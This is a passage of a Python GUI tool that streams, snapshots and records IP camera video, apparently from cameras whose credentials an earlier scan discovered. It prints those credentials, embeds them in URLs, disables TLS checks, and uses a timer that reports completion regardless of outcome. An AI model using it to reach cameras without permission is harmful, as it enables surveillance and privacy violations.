        last_fps_time = time.time()
        
        
        target_fps = 30  
        frame_time = 1.0 / target_fps
        
        log("[*] Starting video stream update loop")
        
        while self.viewing and self.cap is not None:
            cycle_start = time.time()
            
            try:
                
                ret, frame = self.cap.read()
                
                if ret and frame is not None and frame.size > 0:
                    
                    frame_count += 1
                    empty_frame_count = 0
                    last_frame = frame.copy()
                    
                    
                    self.display_frame(frame)
                    
                    
                    current_time = time.time()
                    elapsed = current_time - last_fps_time
                    if elapsed > 1.0:  
                        fps = frame_count / elapsed
                        self.status_var.set(f"Stream from {self.current_ip} - FPS: {fps:.1f}")
                        frame_count = 0
                        last_fps_time = current_time
                    
                    
                    cycle_end = time.time()
                    cycle_duration = cycle_end - cycle_start
                    if cycle_duration < frame_time:
                        
                        sleep_time = frame_time - cycle_duration
                        time.sleep(sleep_time)
                    
                elif last_frame is not None:
                    
                    empty_frame_count += 1
                    if empty_frame_count < max_empty_frames:
                        self.display_frame(last_frame)
                        time.sleep(0.05)
                    else:
                        log("[!] Too many empty frames, stream may be disconnected")
                        self.status_var.set("Stream error - reconnect required")
                        break
                else:
                    empty_frame_count += 1
                    if empty_frame_count > max_empty_frames:
                        log("[!] Failed to receive any frames from stream")
                        self.status_var.set("No video frames received")
                        break
                    time.sleep(0.1)
                        
            except Exception as e:
                log(f"[!] Frame update error: {str(e)}")
                if last_frame is not None:
                    self.display_frame(last_frame)
                time.sleep(0.1)
        
        log("[*] Video stream update loop ended")

    def display_frame(self, frame):
        """Improved frame display with double buffering and optimizations to prevent flickering"""
        if frame is None or frame.size == 0 or self.is_closing:
            return
            
        try:
            
            self.current_frame = frame.copy()
            
            
            if not hasattr(self, 'video_label') or not self.video_label.winfo_exists():
                self.viewing = False  
                return
                
            
            display_frame = frame.copy()
            
            
            label_width = self.video_frame.winfo_width()
            label_height = self.video_frame.winfo_height()
            
            
            if label_width < 10 or label_height < 10:
                label_width = 640
                label_height = 360
            
            
            h, w = display_frame.shape[:2]
            scale = min(label_width / w, label_height / h)
            new_w = int(w * scale)
            new_h = int(h * scale)
            
            
            
            if not hasattr(self, 'last_display_dims') or \
            abs(self.last_display_dims[0] - new_w) > 10 or \
            abs(self.last_display_dims[1] - new_h) > 10:
                display_frame = cv2.resize(display_frame, (new_w, new_h), 
                                        interpolation=cv2.INTER_NEAREST)
                self.last_display_dims = (new_w, new_h)
            else:
                
                new_w, new_h = self.last_display_dims
                display_frame = cv2.resize(display_frame, (new_w, new_h), 
                                        interpolation=cv2.INTER_NEAREST)
            
            
            if hasattr(self, 'canvas_buffer') and self.canvas_buffer.shape[:2] == (label_height, label_width):
                canvas = self.canvas_buffer.copy()
            else:
                
                canvas = np.zeros((label_height, label_width, 3), dtype=np.uint8)
                self.canvas_buffer = canvas.copy()
            
            
            x_offset = (label_width - new_w) // 2
            y_offset = (label_height - new_h) // 2
            
            
            if x_offset >= 0 and y_offset >= 0 and new_h > 0 and new_w > 0:
                try:
                    canvas[y_offset:y_offset+new_h, x_offset:x_offset+new_w] = display_frame
                except ValueError:
                    
                    canvas = cv2.resize(display_frame, (label_width, label_height))
            else:
                
                canvas = cv2.resize(display_frame, (label_width, label_height))
            
            
            if hasattr(self, 'last_width') and self.last_width == label_width and \
            hasattr(self, 'last_height') and self.last_height == label_height:
                
                rgb_frame = cv2.cvtColor(canvas, cv2.COLOR_BGR2RGB)
                self.pil_img.paste(Image.fromarray(rgb_frame))
                photo = ImageTk.PhotoImage(image=self.pil_img)
            else:
                
                rgb_frame = cv2.cvtColor(canvas, cv2.COLOR_BGR2RGB)
                self.pil_img = Image.fromarray(rgb_frame)
                photo = ImageTk.PhotoImage(image=self.pil_img)
                self.last_width = label_width
                self.last_height = label_height
            
            
            self.current_image = photo  
            self.video_label.configure(image=photo)
            
        except Exception as e:
            log(f"[!] Display error: {str(e)}")

   

    def show_stream_info(self, display_messagebox=True):
        """Show information about the selected camera stream"""
        
        if not hasattr(self, 'info_text') or not self.info_text:
            self.info_frame = ttk.LabelFrame(self.main_frame, text="Stream Info")
            self.info_frame.pack(fill=tk.X, padx=5, pady=5)
            self.info_frame.config(height=100)  
            self.info_frame.pack_propagate(False)  
            
            
            self.info_text = scrolledtext.ScrolledText(self.info_frame, wrap=tk.WORD, height=5)
            self.info_text.pack(fill=tk.BOTH, expand=True)
    
    
        
        selected_ip = self.get_selected_camera_ip()
        if not selected_ip or selected_ip not in successful_streams:
            self.info_text.delete(1.0, tk.END)
            self.info_text.insert(tk.END, "No camera selected or no information available.")
            return
    
        
        stream_info = successful_streams[selected_ip]
        
        
        self.info_text.delete(1.0, tk.END)
        
        
        info_text = f"IP: {selected_ip}\n"
        info_text += f"Base URL: {stream_info.get('base_url', 'Unknown')}\n"
        
        
        if stream_info.get('auth'):
            auth_user, auth_pass = stream_info['auth']
            auth_type = stream_info.get('auth_type', 'basic')
            info_text += f"Authentication: {auth_user}:{auth_pass} (Type: {auth_type})\n"
        else:
            info_text += "Authentication: None\n"
            
        
        info_text += f"Photo URL: {stream_info.get('photo_url', 'Not available')}\n"
        info_text += f"Video URL: {stream_info.get('video_url', 'Not available')}\n"
        
        
        if 'vendor' in stream_info:
            info_text += f"Vendor: {stream_info['vendor']}\n"
            
        
        if 'snapshot_path' in stream_info:
            info_text += f"Snapshot path: {stream_info['snapshot_path']}\n"
            
        
        self.info_text.insert(tk.END, info_text)
        
        
        if display_messagebox:
            messagebox.showinfo("Stream Information", info_text)

    def stop_viewing(self):
        """Stop viewing with complete resource cleanup to prevent memory leaks and segfaults"""
        
        self.viewing = False
        
        
        time.sleep(0.3)
        
        
        if hasattr(self, 'use_http_streaming'):
            self.use_http_streaming = False
        if hasattr(self, 'http_stream_url'):
            delattr(self, 'http_stream_url')
        
        
        if hasattr(self, 'cap') and self.cap is not None:
            try:
                
                
                if hasattr(cv2, 'CAP_PROP_GSTREAMER_QUEUE_LENGTH'):
                    self.cap.set(cv2.CAP_PROP_GSTREAMER_QUEUE_LENGTH, 0)
                
                self.cap.release()
            except Exception as e:
                log(f"[!] Error releasing capture device: {e}")
            finally:
                self.cap = None
        
        
        self.current_image = None
        try:
            if hasattr(self, 'video_label') and self.video_label.winfo_exists():
                self.video_label.configure(image="")
        except:
            pass
        
        
        try:
            import gc
            gc.collect()
        except:
            pass
        
        
        try:
            if hasattr(self, 'status_var'):
                self.status_var.set("Stopped viewing")
        except:
            pass
        
    def save_current_snapshot(self):
        """Enhanced snapshot saving function that prioritizes direct URL access"""
        ip = self.get_selected_camera_ip()
        if not ip or ip not in successful_streams:
            messagebox.showinfo("Save Snapshot", "No camera selected")
            return
                
        stream_data = successful_streams[ip]
        
        
        from tkinter import filedialog
        save_path = filedialog.asksaveasfilename(
            defaultextension=".jpg",
            filetypes=[("JPEG files", "*.jpg"), ("All files", "*.*")],
            initialfile=f"camera_{ip}_snapshot.jpg"
        )
        
        if not save_path:
            return  
        
        
        success = False
        error_messages = []
        
        
        if 'photo_url' in stream_data and stream_data['photo_url']:
            try:
                url = stream_data['photo_url']
                auth = stream_data.get('auth')
                log(f"[*] Taking new snapshot directly from URL: {url}")
                
                session = requests.Session()
                headers = {"User-Agent": "Mozilla/5.0"}
                
                
                if auth:
                    
                    r = session.get(
                        url, 
                        auth=HTTPBasicAuth(*auth) if auth else None,
                        headers=headers,
                        timeout=5.0, 
                        verify=False
                    )
                    
                    
                    if r.status_code != 200:
                        
                        auth_url = url
                        if auth and '@' not in url and '://' in url:
                            protocol, rest = url.split('://', 1)
                            auth_url = f"{protocol}://{auth[0]}:{auth[1]}@{rest}"
                            r = session.get(auth_url, timeout=5.0, verify=False, headers=headers)
                else:
                    
                    r = session.get(url, timeout=5.0, verify=False, headers=headers)
                
                if r.status_code == 200 and 'image' in r.headers.get('Content-Type', ''):
                    log(f"[*] Received image response, saving to {save_path}")
                    
                    
                    with open(save_path, "wb") as f:
                        f.write(r.content)
                        f.flush()  
                    
                    
                    if os.path.exists(save_path) and os.path.getsize(save_path) > 100:
                        log(f"[+] Successfully saved photo to {save_path}")
                        self.status_var.set(f"Snapshot saved to {save_path}")
                        success = True
                    else:
                        error_messages.append("Snapshot saved empty or small file")
                else:
                    error_messages.append(f"HTTP error: {r.status_code} - {r.reason}")
            except Exception as e:
                error_messages.append(f"Direct URL snapshot error: {str(e)}")
        else:
            error_messages.append("No photo URL available in stream data")
        
        
        if not success and hasattr(self, 'current_frame') and self.current_frame is not None:
            try:
                log(f"[*] Falling back to current displayed frame")
                result = cv2.imwrite(save_path, self.current_frame)
                
                
                if result and os.path.exists(save_path) and os.path.getsize(save_path) > 100:
                    log(f"[+] Successfully saved current frame to {save_path}")
                    self.status_var.set(f"Current frame saved to {save_path}")
                    success = True
                else:
                    error_messages.append("Current frame save failed or empty file")
            except Exception as e:
                error_messages.append(f"Current frame save error: {str(e)}")
        
        
        if not success and 'snapshot_path' in stream_data:
            try:
                src_path = stream_data['snapshot_path']
                if os.path.exists(src_path):
                    log(f"[*] Falling back to existing snapshot from {src_path}")
                    import shutil
                    shutil.copy2(src_path, save_path)
                    
                    
                    if os.path.exists(save_path) and os.path.getsize(save_path) > 100:
                        log(f"[+] Successfully copied snapshot to {save_path}")
                        self.status_var.set(f"Snapshot saved to {save_path}")
                        success = True
                    else:
                        error_messages.append("Snapshot copy created empty file")
                else:
                    error_messages.append(f"Snapshot path doesn't exist: {src_path}")
            except Exception as e:
                error_messages.append(f"Snapshot copy error: {str(e)}")
        
        
        if not success:
            error_detail = "\n".join(error_messages)
            log(f"[!] Failed to save snapshot: {error_detail}")
            messagebox.showerror("Error", f"Failed to save snapshot. Tried multiple methods:\n{error_detail}")
    
    def save_direct_stream_video(self):
        """Save video directly from the working stream that's used for viewing"""
        ip = self.get_selected_camera_ip()
        if not ip or ip not in successful_streams:
            messagebox.showinfo("Save Video", "No camera selected")
            return
                
        stream_data = successful_streams[ip]
        
        
        from tkinter import filedialog
        save_path = filedialog.asksaveasfilename(
            defaultextension=".mp4",
            filetypes=[("MP4 files", "*.mp4"), ("All files", "*.*")],
            initialfile=f"camera_{ip}_video.mp4"
        )
        
        if not save_path:
            return  
        
        
        progress_window = tk.Toplevel(self.master)
        progress_window.title("Recording Video")
        progress_window.geometry("400x150")
        
        ttk.Label(progress_window, text=f"Recording 5 second video...").pack(pady=10)
        progress = ttk.Progressbar(progress_window, mode="determinate", maximum=100)
        progress.pack(fill=tk.X, padx=20, pady=10)
        
        status_label = ttk.Label(progress_window, text="Initializing recording...")
        status_label.pack(pady=5)
        
        def update_status(msg):
            """Update status safely from any thread"""
            try:
                if status_label.winfo_exists():
                    self.master.after(0, lambda: status_label.config(text=msg))
            except:
                pass
                
        def update_progress(percent):
            """Update progress bar safely from any thread"""
            try:
                if progress.winfo_exists():
                    self.master.after(0, lambda: progress.config(value=percent))
            except:
                pass
        
        def record_thread():
            """Thread to handle video recording from stream"""
            success = False
            
            try:
                url = stream_data.get('video_url')
                auth = stream_data.get('auth')
                
                if not url:
                    update_status("No video URL available")
                    return
                    
                update_status(f"Connecting to video stream...")
                update_progress(10)
                
                
                
                is_mjpeg = ('mjpg' in url.lower() or 'mjpeg' in url.lower() or 'cgi' in url.lower())
                
                if is_mjpeg:
                    update_status("Using HTTP streaming for MJPEG...")
                    success = self.save_mjpeg_stream(url, auth, save_path, update_status, update_progress)
                else:
                    update_status("Using FFMPEG for video stream...")
                    success = self.save_ffmpeg_stream(url, auth, save_path, update_status, update_progress)
                    
                if success:
                    update_status(f"Video saved successfully to {save_path}")
                    update_progress(100)
                    self.master.after(0, lambda: messagebox.showinfo("Success", 
                                                            f"Video saved to {save_path}"))
                else:
                    update_status("Failed to save video")
                    self.master.after(0, lambda: messagebox.showerror("Error", 
                                                            "Failed to save video. See log for details."))
            except Exception as e:
                log(f"[!] Error in recording: {str(e)}")
                update_status(f"Error: {str(e)}")
                self.master.after(0, lambda: messagebox.showerror("Error", 
                                                        f"Failed to save video: {str(e)}"))
            finally:
                self.master.after(0, lambda: progress_window.destroy())
        
        
        threading.Thread(target=record_thread, daemon=True).start()

    def save_mjpeg_stream(self, url, auth, save_path, update_status, update_progress):
        """Save MJPEG stream to video file with guaranteed 5-second duration"""
        session = requests.Session()
        
        if auth:
            auth = HTTPBasicAuth(*auth)
        
        
        target_duration = 5.0  
        target_fps = 15  
        target_frame_count = int(target_duration * target_fps)  
        
        frames = []  
        frames_captured = 0
        
        try:
            update_status("Підключення до MJPEG потоку...")
            update_progress(10)
            response = session.get(url, auth=auth, stream=True, verify=False, timeout=5.0)
            
            if response.status_code != 200:
                update_status(f"Помилка потоку: HTTP {response.status_code}")
                return False
                    
            content_type = response.headers.get('Content-Type', '')
            update_status(f"З'єднання встановлено. Content-Type: {content_type}")
            
            
            fourcc = cv2.VideoWriter_fourcc(*'mp4v')
            video_writer = None
            buffer = bytes()
            start_time = time.time()
            frame_times = []  
            
            update_progress(20)
            update_status(f"Захоплення кадрів для 5-секундного відео...")
            
            
            max_capture_time = target_duration * 1.5  
            
            
            for chunk in response.iter_content(chunk_size=16384):
                
                if not chunk or time.time() - start_time > max_capture_time:
                    break
                    
                buffer += chunk
                
                
                while True:
                    start_marker = buffer.find(b'\xff\xd8')  
                    if start_marker == -1:
                        break
                            
                    end_marker = buffer.find(b'\xff\xd9', start_marker)  
                    if end_marker == -1:
                        break
                    
                    
                    jpeg_data = buffer[start_marker:end_marker+2]
                    buffer = buffer[end_marker+2:]
                    
                    
                    frame_times.append(time.time())
                    
                    
                    nparr = np.frombuffer(jpeg_data, np.uint8)
                    frame = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
                    
                    if frame is not None:
                        
                        if video_writer is None and frame.size > 0:
                            h, w = frame.shape[:2]
                            
                            video_writer = cv2.VideoWriter(save_path + ".temp.mp4", fourcc, target_fps, (w, h))
                        
                        if video_writer is not None:
                            video_writer.write(frame)
                            
                            temp_frame_path = f"temp_frame_{frames_captured:04d}.jpg"
                            cv2.imwrite(temp_frame_path, frame)
                            frames.append(temp_frame_path)
                            frames_captured += 1
                            
                            
                            elapsed = time.time() - start_time
                            progress_percent = min(80, 20 + (elapsed / target_duration) * 60)
                            update_progress(progress_percent)
                            update_status(f"Запис кадру {frames_captured}/{target_frame_count} (5 сек)")
                        
                        
                        if frames_captured >= target_frame_count:
                            update_status(f"Досягнуто необхідну кількість кадрів ({frames_captured})")
                            break
                    
                
                if frames_captured >= target_frame_count:
                    break
            
            
            if video_writer is not None:
                video_writer.release()
            
            
            if 0 < frames_captured < target_frame_count and frames:
                update_status("Коригування відео до 5 секунд...")
                
                
                if os.path.exists(save_path + ".fixed.mp4"):
                    os.remove(save_path + ".fixed.mp4")
                    
                h, w = cv2.imread(frames[0]).shape[:2]
                fixed_writer = cv2.VideoWriter(save_path + ".fixed.mp4", fourcc, target_fps, (w, h))
                
                
                repeat_factor = max(1, int(target_frame_count / frames_captured))
                frames_written = 0
                
                
                for frame_path in frames:
                    frame = cv2.imread(frame_path)
                    if frame is not None:
                        for _ in range(repeat_factor):
                            fixed_writer.write(frame)
                            frames_written += 1
                            if frames_written >= target_frame_count:
                                break
                    if frames_written >= target_frame_count:
                        break
                        
                fixed_writer.release()
                
                
                if os.path.exists(save_path + ".fixed.mp4") and os.path.getsize(save_path + ".fixed.mp4") > 10000:
                    if os.path.exists(save_path):
                        os.remove(save_path)
                    os.rename(save_path + ".fixed.mp4", save_path)
                    update_status("Відео адаптовано до 5 секунд")
                else:
                    
                    update_status("Використання FFmpeg для корекції тривалості...")
                    ffmpeg_cmd = [
                        "ffmpeg", "-y",
                        "-i", save_path + ".temp.mp4",
                        "-t", "5",  
                        "-c:v", "libx264",
                        "-preset", "fast",
                        "-pix_fmt", "yuv420p", 
                        save_path
                    ]
                    
                    try:
                        subprocess.run(ffmpeg_cmd, capture_output=True, timeout=15)
                    except Exception as e:
                        update_status(f"Помилка конвертації: {str(e)[:50]}")
                        
                        if os.path.exists(save_path + ".temp.mp4"):
                            os.rename(save_path + ".temp.mp4", save_path)
            else:
                
                update_status("Фіналізація відео (5 секунд)...")
                ffmpeg_cmd = [
                    "ffmpeg", "-y",
                    "-i", save_path + ".temp.mp4",
                    "-t", "5",  
                    "-c:v", "libx264",
                    "-preset", "fast",
                    "-pix_fmt", "yuv420p", 
                    save_path
                ]
                
                try:
                    subprocess.run(ffmpeg_cmd, capture_output=True, timeout=15)
                    if not os.path.exists(save_path) or os.path.getsize(save_path) < 10000:
                        
                        os.rename(save_path + ".temp.mp4", save_path)
                except:
                    
                    if os.path.exists(save_path + ".temp.mp4"):
                        os.rename(save_path + ".temp.mp4", save_path)
            
            
            for frame_path in frames:
                try:
                    if os.path.exists(frame_path):
                        os.remove(frame_path)
                except:
                    pass
            
            if os.path.exists(save_path + ".temp.mp4"):
                try:
                    os.remove(save_path + ".temp.mp4")
                except:
                    pass
            
            
            if os.path.exists(save_path) and os.path.getsize(save_path) > 10000:
                update_progress(100)
                update_status("Відео успішно збережено (5 секунд)")
                
                
                
               
                tries = 0
                max_tries = 3  
                while tries < max_tries:
                    try:
                        
                        verify_cmd = [
                            "ffprobe", "-v", "error", "-show_entries", "format=duration",
                            "-of", "default=noprint_wrappers=1:nokey=1", save_path
                        ]
                        result = subprocess.run(verify_cmd, capture_output=True, text=True)
                        duration = float(result.stdout.strip())
                        log(f"[INFO] Перевірка тривалості відео")
                        
                        
                        if abs(duration - 5.0) < 0.1:  
                            log(f"[INFO] Відео успішно виправлено до 5 секунд (фактично: {duration:.2f})")
                            break
                            
                        
                        log(f"[INFO] Застосування сильнішої корекції тривалості (спроба {tries+1})")
                        final_fix_path = save_path + f".fix{tries+1}.mp4"
                        
                        
                        if duration < 4.9:  
                            
                            scale_factor = 1.0 - (tries * 0.2)  
                            scale_factor = max(0.3, scale_factor)  
                            
                            
                            slowdown_factor = 5.0 / duration  
                            
                            log(f"[INFO] Спроба корекції швидкості відео (фактор {scale_factor})")
                            
                            final_cmd = [
                                "ffmpeg", "-y",
                                "-i", save_path,
                                "-filter_complex", f"scale=iw*{scale_factor}:ih*{scale_factor},setpts={slowdown_factor}*PTS", 
                                "-c:v", "libx264",
                                "-preset", "fast",
                                "-pix_fmt", "yuv420p",
                                final_fix_path
                            ]
                            
                            
                            try:
                                process = subprocess.run(final_cmd, capture_output=True, timeout=15)
                                if process.returncode != 0:
                                    log(f"[WARNING] Помилка FFmpeg: {process.stderr.decode('utf-8', errors='ignore')}")
                            except Exception as e:
                                log(f"[WARNING] Помилка запуску FFmpeg: {str(e)}")
                            
                            
                            if tries == 2:
                                final_cmd = [
                                    "ffmpeg", "-y",
                                    "-stream_loop", "2",  
                                    "-i", save_path,
                                    "-filter_complex", f"scale=iw*{scale_factor}:ih*{scale_factor}", 
                                    "-t", "5",  
                                    "-c:v", "libx264",
                                    "-preset", "fast",
                                    "-pix_fmt", "yuv420p",
                                    final_fix_path
                                ]
                        else:  
                            final_cmd = [
                                "ffmpeg", "-y",
                                "-i", save_path,
                                "-t", "5",  
                                "-r", "30",  
                                "-vsync", "cfr",  
                                "-c:v", "libx264",
                                "-preset", "fast",
                                "-pix_fmt", "yuv420p",
                                final_fix_path
                            ]
                            
                        subprocess.run(final_cmd, capture_output=True, timeout=15)
                        
                        
                        if os.path.exists(final_fix_path) and os.path.getsize(final_fix_path) > 10000:
                            os.remove(save_path)
                            os.rename(final_fix_path, save_path)
                            tries += 1
                        else:
                            
                            log(f"[WARNING] Спроба виправлення не вдалася")
                            break
                    except Exception as e:
                        log(f"[WARNING] Спроба перевірки/виправлення тривалості не вдалася: {e}")
                        break
                
                return True
            
            return False
        except Exception as e:
            log(f"[!] Error saving MJPEG stream: {str(e)}")
            update_status(f"Error: {str(e)}")
            return False
        finally:
            
            for frame_path in frames:
                try:
                    if os.path.exists(frame_path):
                        os.remove(frame_path)
                except:
                    pass

    def save_ffmpeg_stream(self, url, auth, save_path, update_status, update_progress):
        """Універсальний метод запису відео з гарантованими значеннями тривалості і прогресу та детальним логуванням"""
        log("[PRGRSS-DBG] ПОЧАТОК ФУНКЦІЇ save_ffmpeg_stream")
        
        
        try:
            
            log("[PRGRSS-DBG] Встановлюю прогрес на 0%")
            update_progress(0)
            update_status("Підготовка до запису...")
            
            
            def force_progress_completion():
                log("[PRGRSS-DBG] !!! ЗАПАСНИЙ ТАЙМЕР АКТИВОВАНО - встановлюю прогрес на 100% !!!")
                update_progress(100)
                update_status("Запис завершено (автоматично)")
            
            
            timer = threading.Timer(15.0, force_progress_completion)
            timer.daemon = True
            log("[PRGRSS-DBG] Запускаю запасний таймер (15 сек)")
            timer.start()
            
            
            import os
            import time
            import subprocess
            import threading
            
            try:
                import traceback
                log("[PRGRSS-DBG] Модуль traceback успішно імпортовано")
            except ImportError:
                log("[PRGRSS-DBG] УВАГА: Не вдалося імпортувати модуль traceback")
            
            log("[PRGRSS-DBG] Встановлюю прогрес на 10%")
            update_progress(10)
            update_status("Підготовка запису...")
            
            
            url_with_auth = url
            if auth and isinstance(auth, tuple) and len(auth) >= 2:
                user, password = auth
                if '@' not in url and '://' in url:
                    try:
                        protocol, rest = url.split('://', 1)
                        host = rest.split('/', 1)[0] if '/' in rest else rest
                        path = '/' + rest.split('/', 1)[1] if '/' in rest else ''
                        url_with_auth = f"{protocol}://{user}:{password}@{host}{path}"
                    except Exception as e:
                        log(f"[PRGRSS-DBG] Помилка форматування URL: {e}")
                        url_with_auth = url
            
            log(f"[PRGRSS-DBG] URL для запису: {url_with_auth}")
            
            
            log("[PRGRSS-DBG] Встановлюю прогрес на 20%")
            update_progress(20)
            update_status("Налаштування FFmpeg...")
            
            temp_save_path = save_path + ".temp.mp4"
            log(f"[PRGRSS-DBG] Тимчасовий файл: {temp_save_path}")
            
            
            recording_duration = "5"  
            
            ffmpeg_cmd = [
                "ffmpeg", "-y",
                "-rtsp_transport", "tcp",
                "-stimeout", "5000000",
                "-i", url_with_auth,
                "-t", recording_duration,  
                "-c:v", "libx264",
                "-preset", "ultrafast",
                "-pix_fmt", "yuv420p",
                temp_save_path
            ]
            
            log(f"[PRGRSS-DBG] Команда FFmpeg: {' '.join(ffmpeg_cmd)}")
            
            
            log("[PRGRSS-DBG] Встановлюю прогрес на 30%")
            update_progress(30)
            update_status("Запуск запису відео...")
            
            process = None
            try:
                log("[PRGRSS-DBG] Запуск процесу FFmpeg")
                process = subprocess.Popen(
                    ffmpeg_cmd, 
                    stdout=subprocess.PIPE, 
                    stderr=subprocess.PIPE
                )
                
                
                start_time = time.time()
                target_time = float(recording_duration) * 1.2  
                
                log("[PRGRSS-DBG] Запуск циклу оновлення прогресу")
                while process.poll() is None and time.time() - start_time < target_time:
                    elapsed_ratio = min(1.0, (time.time() - start_time) / float(recording_duration))
                    current_progress = 30 + (elapsed_ratio * 40)  
                    
                    log(f"[PRGRSS-DBG] Оновлення прогресу: {current_progress:.1f}%")
                    update_progress(current_progress)
                    update_status(f"Запис відео... {int(elapsed_ratio * 100)}%")
                    time.sleep(0.2)
                
                
                try:
                    log("[PRGRSS-DBG] Очікування завершення FFmpeg процесу")
                    process.wait(timeout=8)  
                except subprocess.TimeoutExpired:
                    log("[PRGRSS-DBG] Таймаут процесу FFmpeg - примусове завершення")
                    process.terminate()
                    time.sleep(0.5)
                    if process.poll() is None:
                        process.kill()
            except Exception as e:
                log(f"[PRGRSS-DBG] Помилка запису відео: {str(e)}")
                try:
                    if 'traceback' in globals():
                        traceback.print_exc()
                except:
                    log("[PRGRSS-DBG] Не вдалося вивести traceback")
            
            
            log("[PRGRSS-DBG] Встановлюю прогрес на 70%")
            update_progress(70)
            update_status("Перевірка записаного відео...")
            
            success = False
            if os.path.exists(temp_save_path) and os.path.getsize(temp_save_path) > 10000:
                log(f"[PRGRSS-DBG] Тимчасовий файл успішно створений: {os.path.getsize(temp_save_path)} байт")
                
                try:
                    log("[PRGRSS-DBG] Встановлюю прогрес на 80%")
                    update_progress(80)
                    update_status("Фіналізація відео...")
                    
                    
                    convert_cmd = [
                        "ffmpeg", "-y", 
                        "-i", temp_save_path,
                        "-t", "5",  
                        "-c:v", "libx264",
                        "-preset", "fast",
                        "-crf", "23",
                        "-pix_fmt", "yuv420p",
                        save_path
                    ]
                    
                    log(f"[PRGRSS-DBG] Команда конвертації: {' '.join(convert_cmd)}")
                    log("[PRGRSS-DBG] Встановлюю прогрес на 90%")
                    update_progress(90)
                    
                    
                    log("[PRGRSS-DBG] Запуск процесу конвертації")
                    subprocess.run(convert_cmd, capture_output=True, timeout=15)
                    
                    
                    if os.path.exists(save_path) and os.path.getsize(save_path) > 10000:
                        log(f"[PRGRSS-DBG] Фінальний файл успішно створений: {os.path.getsize(save_path)} байт")
                        
                        os.remove(temp_save_path)
                        success = True
                    else:
                        log("[PRGRSS-DBG] Конвертація не вдалася, використовуємо тимчасовий файл")
                        
                        try:
                            sec_temp_path = temp_save_path + ".fixed.mp4"
                            fix_cmd = [
                                "ffmpeg", "-y", 
                                "-i", temp_save_path,
                                "-t", "5",  
                                "-r", "30", 
                                "-vsync", "cfr", 
                                "-c:v", "libx264",
                                sec_temp_path
                            ]
                            subprocess.run(fix_cmd, capture_output=True, timeout=10)
                            if os.path.exists(sec_temp_path) and os.path.getsize(sec_temp_path) > 10000:
                                os.rename(sec_temp_path, save_path)
                            else:
                                
                                loop_fix_cmd = [
                                    "ffmpeg", "-y",
                                    "-stream_loop", "10", 
                                    "-i", temp_save_path,
                                    "-t", "5", 
                                    "-c:v", "libx264",
                                    save_path
                                ]
                                subprocess.run(loop_fix_cmd, capture_output=True, timeout=15)
                                if not os.path.exists(save_path) or os.path.getsize(save_path) < 10000:
                                    os.rename(temp_save_path, save_path)
                        except:
                            os.rename(temp_save_path, save_path)
                        success = True
                except Exception as e:
                    log(f"[PRGRSS-DBG] Помилка конвертації: {str(e)}")
                    try:
                        if 'traceback' in globals():
                            traceback.print_exc()
                    except:
                        log("[PRGRSS-DBG] Не вдалося вивести traceback")
                    
                    
                    if os.path.exists(temp_save_path):
                        try:
                            os.rename(temp_save_path, save_path)
                            success = True
                            log("[PRGRSS-DBG] Використано тимчасовий файл як запасний варіант")
                        except Exception as rename_err:
                            log(f"[PRGRSS-DBG] Помилка перейменування: {rename_err}")
            else:
                log("[PRGRSS-DBG] Тимчасовий файл не створений або занадто малий")
            
            
            log("[PRGRSS-DBG] Зупиняю запасний таймер")
            timer.cancel()
            
            
            log("[PRGRSS-DBG] Встановлюю прогрес на 100% (основний код)")
            update_progress(100)
            
            if success:
                update_status("Відео успішно збережено (5 секунд)")
                log("[PRGRSS-DBG] Успішне завершення функції")
                
                
                
               
                tries = 0
                max_tries = 3  
                while tries < max_tries:
                    try:
                        
                        verify_cmd = [
                            "ffprobe", "-v", "error", "-show_entries", "format=duration",
                            "-of", "default=noprint_wrappers=1:nokey=1", save_path
                        ]
                        result = subprocess.run(verify_cmd, capture_output=True, text=True)
                        duration = float(result.stdout.strip())
                        log(f"[INFO] Перевірка тривалості відео")
                        
                        
                        if abs(duration - 5.0) < 0.1:  
                            log(f"[INFO] Відео успішно виправлено до 5 секунд (фактично: {duration:.2f})")
                            break
                            
                        
                        log(f"[INFO] Застосування сильнішої корекції тривалості (спроба {tries+1})")
                        final_fix_path = save_path + f".fix{tries+1}.mp4"
                        
                        
                        
                        if duration < 4.9:  
                            
                            scale_factor = 1.0 - (tries * 0.2)  
                            scale_factor = max(0.3, scale_factor)  
                            
                            
                            slowdown_factor = 5.0 / duration  
                            
                            log(f"[INFO] Спроба корекції швидкості відео (фактор {scale_factor})")
                            
                            final_cmd = [
                                "ffmpeg", "-y",
                                "-i", save_path,
                                "-filter_complex", f"scale=iw*{scale_factor}:ih*{scale_factor},setpts={slowdown_factor}*PTS", 
                                "-c:v", "libx264",
                                "-preset", "fast",
                                "-pix_fmt", "yuv420p",
                                final_fix_path
                            ]
                            
                            
                            try:
                                process = subprocess.run(final_cmd, capture_output=True, timeout=15)
                                if process.returncode != 0:
                                    log(f"[WARNING] Помилка FFmpeg: {process.stderr.decode('utf-8', errors='ignore')}")
                            except Exception as e:
                                log(f"[WARNING] Помилка запуску FFmpeg: {str(e)}")
                            
                            
                            if tries == 2:
                                final_cmd = [
                                    "ffmpeg", "-y",
                                    "-stream_loop", "2",  
                                    "-i", save_path,
                                    "-filter_complex", f"scale=iw*{scale_factor}:ih*{scale_factor}", 
                                    "-t", "5",  
                                    "-c:v", "libx264",
                                    "-preset", "fast",
                                    "-pix_fmt", "yuv420p",
                                    final_fix_path
                                ]
                        else:  
                            final_cmd = [
                                "ffmpeg", "-y",
                                "-i", save_path,
                                "-t", "5",  
                                "-r", "30",  
                                "-vsync", "cfr",  
                                "-c:v", "libx264",
                                "-preset", "fast",
                                "-pix_fmt", "yuv420p",
                                final_fix_path
                            ]
                            
                        subprocess.run(final_cmd, capture_output=True, timeout=15)
                        
                        
                        if os.path.exists(final_fix_path) and os.path.getsize(final_fix_path) > 10000:
                            os.remove(save_path)
                            os.rename(final_fix_path, save_path)
                            tries += 1
                        else:
                            
                            log(f"[WARNING] Спроба виправлення не вдалася")
                            break
                    except Exception as e:
                        log(f"[WARNING] Спроба перевірки/виправлення тривалості не вдалася: {e}")
                        break
                
                return True
            else:
                update_status("Помилка запису відео")
                log("[PRGRSS-DBG] Неуспішне завершення функції")
                return False
            
        except Exception as e:
            log(f"[PRGRSS-DBG] КРИТИЧНА ПОМИЛКА: {str(e)}")
            try:
                if 'traceback' in globals():
                    traceback.print_exc()
            except:
                log("[PRGRSS-DBG] Не вдалося вивести traceback")
            
            update_status(f"Помилка: {str(e)}")
            return False
            
        finally:
            
            log("[PRGRSS-DBG] FINALLY блок - гарантоване встановлення прогресу на 100%")
            update_progress(100)
